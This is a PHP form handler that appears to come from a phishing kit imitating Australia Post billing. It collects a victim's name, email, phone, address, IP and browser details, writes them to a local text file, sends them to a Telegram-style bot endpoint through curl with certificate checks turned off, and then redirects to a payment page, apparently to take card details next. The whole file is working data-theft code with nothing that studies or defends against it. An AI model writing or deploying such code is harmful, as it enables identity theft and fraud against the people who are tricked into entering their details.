<?php
session_start();
require_once('config.php');
$IP = getenv("REMOTE_ADDR");

if(empty($_POST['fname']) || empty($_POST['billing_Address1']) || empty($_POST['billing_City']) || empty($_POST['billing_PostalCode']) )
{

	header('Location: index.php');
}
else{


$message .= "--++-----[	🛈 Billing Post AU [ " . $IP . " ] ]-----++--\n";
$message .= "-------------------\n";
$message .= "Full Name : ".$_POST['fname']."\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Phone: ".$_POST['billing_PhoneHome']."\n";
$message .= "Addresse 1 : ".$_POST['billing_Address1']."\n";
$message .= "Addresse 2 OPT : ".$_POST['billing_Address2']."\n";
$message .= "State : ".$_POST['billing_State']."\n";
$message .= "City : ".$_POST['billing_City']."\n";
$message .= "Postcode : ".$_POST['billing_PostalCode']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$sender = "billing";
$subject = "🛈 Billing Poste AU [ " . $IP . " ] ";
$email = "".$rezmail."";
$text = fopen('../omar.txt', 'a');
fwrite($text, $message);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);


header("Location: payment.php");

}

?>
